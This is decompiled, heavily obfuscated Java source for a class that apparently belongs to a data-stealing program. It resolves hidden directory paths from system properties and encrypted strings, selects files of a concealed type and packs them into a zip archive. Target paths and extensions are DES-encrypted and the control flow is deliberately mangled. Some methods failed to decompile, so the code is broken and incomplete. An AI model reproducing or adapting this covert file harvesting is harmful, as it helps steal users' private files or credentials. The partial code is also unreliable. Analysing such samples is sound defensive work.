/*
 * Decompiled with CFR 0.152.
 */
package a.b.c.j;

import a.b.c.f.u;
import a.b.c.g.s5;
import a.b.c.j.o;
import java.io.File;
import java.io.IOException;
import java.lang.invoke.MethodHandles;
import java.nio.file.Files;
import java.security.Key;
import java.util.Arrays;
import java.util.List;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;
import javax.crypto.Cipher;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.DESKeySpec;
import javax.crypto.spec.IvParameterSpec;

public class p {
    public static final p INSTANCE;
    private static final List<String> B;
    private static final String[] t;
    private static final String[] J;
    private static final long a;

    private p() {
    }

    public void toOutput(ZipOutputStream zipOutputStream) {
        long l2 = a ^ 0x51C3F81C9B26L;
        long l3 = l2 ^ 0x1587EBA4D24L;
        int n2 = (int)(l3 >>> 32);
        long l4 = l3 << 32 >>> 32;
        try {
            this.y(new File(System.getProperty(p.f(17845, 30968)) + p.f(17842, 10392)), n2, l4, p.f(17844, -15846), zipOutputStream);
            this.y(new File(System.getProperty(p.f(17840, -21860)) + p.f(17846, 27475)), n2, l4, p.f(17841, -30834), zipOutputStream);
        }
        catch (Exception exception) {
            exception.printStackTrace();
        }
    }

    /*
     * Loose catch block
     */
    private void y(File file, int n2, long l2, String string, ZipOutputStream zipOutputStream) {
        File[] fileArray;
        u[] uArray;
        boolean bl;
        block24: {
            File[] fileArray2;
            block25: {
                File file2;
                block23: {
                    block32: {
                        block22: {
                            boolean bl2;
                            block21: {
                                block30: {
                                    long l3 = ((long)n2 << 32 | l2 << 32 >>> 32) ^ a;
                                    bl = o.b();
                                    uArray = o.Z();
                                    bl2 = file.exists();
                                    if (bl) break block21;
                                    if (!bl2) break block22;
                                    break block30;
                                    catch (IOException iOException) {
                                        throw p.E(iOException);
                                    }
                                }
                                try {
                                    block31: {
                                        file2 = file;
                                        if (bl) break block23;
                                        break block31;
                                        catch (IOException iOException) {
                                            throw p.E(iOException);
                                        }
                                    }
                                    bl2 = file2.isDirectory();
                                }
                                catch (IOException iOException) {
                                    throw p.E(iOException);
                                }
                            }
                            if (bl2) break block32;
                        }
                        return;
                    }
                    file2 = file;
                }
                fileArray2 = file2.listFiles();
                try {
                    try {
                        fileArray = fileArray2;
                        if (bl) break block24;
                        if (fileArray != null) break block25;
                    }
                    catch (RuntimeException runtimeException) {
                        throw p.a(runtimeException);
                    }
                }
                catch (IOException iOException) {
                    throw p.E(iOException);
                }
                return;
            }
            fileArray = fileArray2;
        }
        File[] fileArray3 = fileArray;
        int n3 = fileArray3.length;
        int n4 = 0;
        while (n4 < n3) {
            boolean bl3;
            block27: {
                block28: {
                    block29: {
                        File file3 = fileArray3[n4];
                        try {
                            bl3 = bl;
                            if (uArray == null) break block27;
                            if (bl3) break block28;
                        }
                        catch (IOException iOException) {
                            throw p.a(iOException);
                        }
                        try {
                            block33: {
                                if (!file3.isFile()) break block29;
                                break block33;
                                catch (IOException iOException) {
                                    throw p.E(iOException);
                                }
                            }
                            if (!this.T(file3)) break block29;
                        }
                        catch (IOException iOException) {
                            throw p.E(iOException);
                        }
                        try {
                            String string2 = string + "/" + file3.getName();
                            zipOutputStream.putNextEntry(new ZipEntry(string2));
                            Files.copy(file3.toPath(), zipOutputStream);
                            zipOutputStream.closeEntry();
                        }
                        catch (IOException iOException) {
                            iOException.printStackTrace();
                        }
                    }
                    ++n4;
                }
                bl3 = bl;
            }
            if (!bl3) continue;
        }
    }

    private boolean T(File file) {
        String string = file.getName().toLowerCase();
        return B.stream().anyMatch(string::endsWith);
    }

    /*
     * Unable to fully structure code
     */
    static {
        block29: {
            block30: {
                block28: {
                    block27: {
                        p.a = s5.a(-3419911731434254452L, -479622908158426040L, MethodHandles.lookup().lookupClass()).a(35251672141879L);
                        var9 = p.a ^ 115932438888205L;
                        var1_1 = Cipher.getInstance("DES/CBC/PKCS5Padding");
                        v0 = SecretKeyFactory.getInstance("DES");
                        v1 = new byte[8];
                        v2 = v1;
                        v1[0] = (byte)(var9 >>> 56);
                        for (var2_2 = 1; var2_2 < 8; ++var2_2) {
                            v2 = v2;
                            v2[var2_2] = (byte)(var9 << var2_2 * 8 >>> 56);
                        }
                        var1_1.init(2, (Key)v0.generateSecret(new DESKeySpec(v2)), new IvParameterSpec(new byte[8]));
                        var0_3 = new String[2];
                        var6_4 = 0;
                        var5_5 = "\u00be\u00d3\u00c3\u0011\u009b\u001a4+\u00e3x\u000b\u00e1Z\u0012\u00b0\u00ea\u009a\u00fe9\u00ff${c\u009e\u00da\u00c9\u00aeK\u00d7\u0092\u00e2&/\u00e5F\u00b14)pS\u00bc9\u00f8b\u00b1\u00b1p\u00a0 \u00cc\u00b7\u00d1P\u008a\u00af\u00c2\u0004o\u00e4\u00b8\u0006%=\u00dd\u00c7_\u00b4\u00a8E\u00c6\u00f6\u00ef-H\u00f4m\u00c9V'\u00ec\u00ea\u00aee\u00c8E\u001ai'8\u00d2\u0011z\u00a6\u00f1\u0010\u00be\u00a4x\u008aP\u00d8y\u00b01TT\u001a\u00b2a\u0091.`\u0001\u00f6\u009c\u00f1\u0017\u0014l\u00ac\u001e\u0013\u0080\u00b8\u00b3\u0013\u00f2i\u00b1\u00af \u00ceQ\u0011\u009a\u0089\u009d\u00bc\u00fb\u008d,E\u00e3X\u00cf";
                        var7_6 = "\u00be\u00d3\u00c3\u0011\u009b\u001a4+\u00e3x\u000b\u00e1Z\u0012\u00b0\u00ea\u009a\u00fe9\u00ff${c\u009e\u00da\u00c9\u00aeK\u00d7\u0092\u00e2&/\u00e5F\u00b14)pS\u00bc9\u00f8b\u00b1\u00b1p\u00a0 \u00cc\u00b7\u00d1P\u008a\u00af\u00c2\u0004o\u00e4\u00b8\u0006%=\u00dd\u00c7_\u00b4\u00a8E\u00c6\u00f6\u00ef-H\u00f4m\u00c9V'\u00ec\u00ea\u00aee\u00c8E\u001ai'8\u00d2\u0011z\u00a6\u00f1\u0010\u00be\u00a4x\u008aP\u00d8y\u00b01TT\u001a\u00b2a\u0091.`\u0001\u00f6\u009c\u00f1\u0017\u0014l\u00ac\u001e\u0013\u0080\u00b8\u00b3\u0013\u00f2i\u00b1\u00af \u00ceQ\u0011\u009a\u0089\u009d\u00bc\u00fb\u008d,E\u00e3X\u00cf".length();
                        var4_7 = 88;
                        var3_8 = -1;
lbl19:
                        // 2 sources

                        while (true) {
                            continue;
                            break;
                        }
lbl21:
                        // 1 sources

                        while (true) {
                            var0_3[var6_4++] = p.a(var8_9).intern();
                            if ((var3_8 += var4_7) < var7_6) {
                                var4_7 = var5_5.charAt(var3_8);
                                ** continue;
                            }
                            break block27;
                            break;
                        }
                        v3 = ++var3_8;
                        var8_9 = var1_1.doFinal(var5_5.substring(v3, v3 + var4_7).getBytes("ISO-8859-1"));
                        ** while (true)
                    }
                    var16_10 = new String[7];
                    var14_11 = 0;
                    var13_12 = var0_3[0];
                    var15_13 = var13_12.length();
                    var12_14 = 19;
                    var11_15 = -1;
lbl38:
                    // 2 sources

                    while (true) {
                        v4 = 65;
                        v5 = ++var11_15;
                        v6 = var13_12.substring(v5, v5 + var12_14);
                        v7 = -1;
                        break block28;
                        break;
                    }
lbl44:
                    // 1 sources

                    while (true) {
                        var16_10[var14_11++] = v8.intern();
                        if ((var11_15 += var12_14) < var15_13) {
                            var12_14 = var13_12.charAt(var11_15);
                            ** continue;
                        }
                        var13_12 = var0_3[1];
                        var15_13 = var13_12.length();
                        var12_14 = 21;
                        var11_15 = -1;
lbl53:
                        // 2 sources

                        while (true) {
                            v4 = 17;
                            v9 = ++var11_15;
                            v6 = var13_12.substring(v9, v9 + var12_14);
                            v7 = 0;
                            break block28;
                            break;
                        }
                        break;
                    }
lbl59:
                    // 1 sources

                    while (true) {
                        var16_10[var14_11++] = v8.intern();
                        if ((var11_15 += var12_14) < var15_13) {
                            var12_14 = var13_12.charAt(var11_15);
                            ** continue;
                        }
                        break block29;
                        break;
                    }
                }
                v10 = v6.toCharArray();
                v11 = v10.length;
                var17_16 = 0;
                try {
                    v12 = v4;
                    v13 = v10;
                    v14 = v11;
                    if (v11 > 1) break block30;
lbl77:
                    // 2 sources

                    while (true) {
                        v15 = v12;
                        v13 = v13;
                        v16 = v13;
                        v17 = v12;
                        v18 = var17_16;
                        break;
                    }
                }
                catch (RuntimeException v19) {
                    throw p.a(v19);
                }
                while (true) {
                    switch (var17_16 % 7) {
                        case 0: {
                            v20 = 23;
                            break;
                        }
                        case 1: {
                            v20 = 3;
                            break;
                        }
                        case 2: {
                            v20 = 50;
                            break;
                        }
                        case 3: {
                            v20 = 32;
                            break;
                        }
                        case 4: {
                            v20 = 59;
                            break;
                        }
                        case 5: {
                            v20 = 115;
                            break;
                        }
                        default: {
                            v20 = 102;
                        }
                    }
                    try {
                        v16[v18] = (char)(v16[v18] ^ (v17 ^ v20));
                        ++var17_16;
                        v12 = v15;
                        if (v15 != 0) break;
                        v15 = v12;
                        v13 = v13;
                        v18 = v12;
                        v16 = v13;
                        v17 = v12;
                    }
                    catch (RuntimeException v21) {
                        throw p.a(v21);
                    }
                }
            }
            v22 = v13;
            v14 = v14;
            ** while (v14 > var17_16)
lbl128:
            // 1 sources

            v8 = new String(v22);
            switch (v7) {
                default: {
                    ** continue;
                }
                ** case 0:
lbl135:
                // 1 sources

                ** continue;
            }
        }
        p.t = var16_10;
        p.J = new String[7];
        p.INSTANCE = new p();
        p.B = Arrays.asList(new String[]{p.f(17847, -1722)});
    }

    private static IOException E(IOException iOException) {
        return iOException;
    }

    /*
     * Exception decompiling
     */
    private static String f(int var0, int var1_1) {
        /*
         * This method has failed to decompile.  When submitting a bug report, please provide this stack trace, and (if you hold appropriate legal rights) the relevant class file.
         * 
         * org.benf.cfr.reader.util.ConfusedCFRException: Tried to end blocks [0[TRYBLOCK]], but top level block is 4[SWITCH]
         *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.processEndingBlocks(Op04StructuredStatement.java:435)
         *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.buildNestedBlocks(Op04StructuredStatement.java:484)
         *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op03SimpleStatement.createInitialStructuredBlock(Op03SimpleStatement.java:736)
         *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisInner(CodeAnalyser.java:850)
         *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisOrWrapFail(CodeAnalyser.java:278)
         *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysis(CodeAnalyser.java:201)
         *     at org.benf.cfr.reader.entities.attributes.AttributeCode.analyse(AttributeCode.java:94)
         *     at org.benf.cfr.reader.entities.Method.analyse(Method.java:531)
         *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1055)
         *     at org.benf.cfr.reader.entities.ClassFile.analyseTop(ClassFile.java:942)
         *     at org.benf.cfr.reader.Driver.doJarVersionTypes(Driver.java:257)
         *     at org.benf.cfr.reader.Driver.doJar(Driver.java:139)
         *     at org.benf.cfr.reader.CfrDriverImpl.analyse(CfrDriverImpl.java:76)
         *     at org.benf.cfr.reader.Main.main(Main.java:54)
         */
        throw new IllegalStateException("Decompilation failed");
    }

    private static Exception a(Exception exception) {
        return exception;
    }

    private static String a(byte[] byArray) {
        int n2 = 0;
        int n3 = byArray.length;
        char[] cArray = new char[n3];
        for (int i2 = 0; i2 < n3; ++i2) {
            char c2;
            int n4 = 0xFF & byArray[i2];
            if (n4 < 192) {
                cArray[n2++] = (char)n4;
                continue;
            }
            if (n4 < 224) {
                c2 = (char)((char)(n4 & 0x1F) << 6);
                n4 = byArray[++i2];
                c2 = (char)(c2 | (char)(n4 & 0x3F));
                cArray[n2++] = c2;
                continue;
            }
            if (i2 >= n3 - 2) continue;
            c2 = (char)((char)(n4 & 0xF) << 12);
            n4 = byArray[++i2];
            c2 = (char)(c2 | (char)(n4 & 0x3F) << 6);
            n4 = byArray[++i2];
            c2 = (char)(c2 | (char)(n4 & 0x3F));
            cArray[n2++] = c2;
        }
        return new String(cArray, 0, n2);
    }
}

